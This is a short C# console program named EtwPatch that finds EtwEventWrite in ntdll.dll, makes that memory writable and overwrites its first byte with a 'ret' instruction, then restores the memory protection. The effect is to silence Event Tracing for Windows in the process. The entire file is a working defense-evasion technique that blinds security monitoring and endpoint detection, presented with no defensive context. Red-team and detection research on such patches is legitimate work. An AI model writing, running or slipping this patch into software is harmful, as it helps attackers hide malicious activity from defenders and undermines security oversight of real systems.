using System;
using System.Runtime.InteropServices;

namespace EtwPatch
{
    internal class Program
    {
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect, out uint lpflOldProtect);
        static void Main(string[] args)
        {
            // get location of ntdll.dll
            var hModule = LoadLibrary("ntdll.dll");
            Console.WriteLine("ndtll: 0x{0:X}", hModule.ToInt64());

            // find EtwEventWrite
            var hfunction = GetProcAddress(hModule, "EtwEventWrite");
            Console.WriteLine("EtwEventWrite: 0x{0:X}", hfunction.ToInt64());

            var patch = new byte[] { 0xC3 };

            // mark as RW
            VirtualProtect(hfunction, (UIntPtr)patch.Length, 0x04, out uint oldProtect);
            Console.WriteLine("Memory: 0x{0:X} -> 0x04", oldProtect);

            // write a ret
            Marshal.Copy(patch, 0, hfunction, patch.Length);

            // restore memory
            VirtualProtect(hfunction, (UIntPtr)patch.Length, oldProtect, out _);
            Console.WriteLine("Memory: 0x04 -> 0x{0:X}", oldProtect);

            Console.ReadKey();
        }
    }
}
